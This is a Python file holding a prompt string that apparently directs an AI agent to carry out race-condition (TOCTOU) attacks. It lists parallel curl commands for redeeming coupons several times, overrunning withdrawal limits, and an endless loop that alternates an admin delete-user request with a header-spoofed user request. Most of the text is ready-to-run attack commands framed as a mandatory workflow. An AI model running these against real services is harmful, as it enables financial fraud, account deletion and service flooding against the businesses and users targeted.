"""
Race Condition / TOCTOU Attack Skill Prompt.
"""

RACE_CONDITION_SKILL_PROMPT = """
## ATTACK SKILL: RACE CONDITION / TOCTOU

**CRITICAL: This attack skill has been CLASSIFIED as race condition.**

### MANDATORY RACE CONDITION WORKFLOW

#### STEP 1: DETECTION — Find Race-Condition-Sensitive Operations

Targets: coupon codes, gift cards, seat booking, fund transfers, voting, inventory, rate limits.

```bash
# Test with parallel requests using curl
curl -X POST https://TARGET/redeem -d 'code=ONCE_PER_USER' &
curl -X POST https://TARGET/redeem -d 'code=ONCE_PER_USER' &
curl -X POST https://TARGET/redeem -d 'code=ONCE_PER_USER' &
wait
```

#### STEP 2: LIMIT-OVERRUN PATTERNS

**Parallel withdrawal:**
```bash
for i in $(seq 1 20); do
  curl -X POST https://TARGET/withdraw -d 'amount=100' &
done; wait
```

**Coupon code reuse:**
```bash
seq 1 50 | xargs -P50 -I{} curl -X POST https://TARGET/apply-coupon -d 'code=WELCOME50'
```

#### STEP 3: ENDPOINT SWITCHING RACE

```bash
# Rapidly alternate between two requests
while true; do
  curl https://TARGET/admin/delete-user?id=1 &
  curl https://TARGET/api/users/1 -H 'X-Original-User: 2' &
done
```

#### ANTI-PATTERNS: Don't test only with 2 parallel requests — use 20-50. Don't ignore timing-based races that only work at specific request ordering.
"""
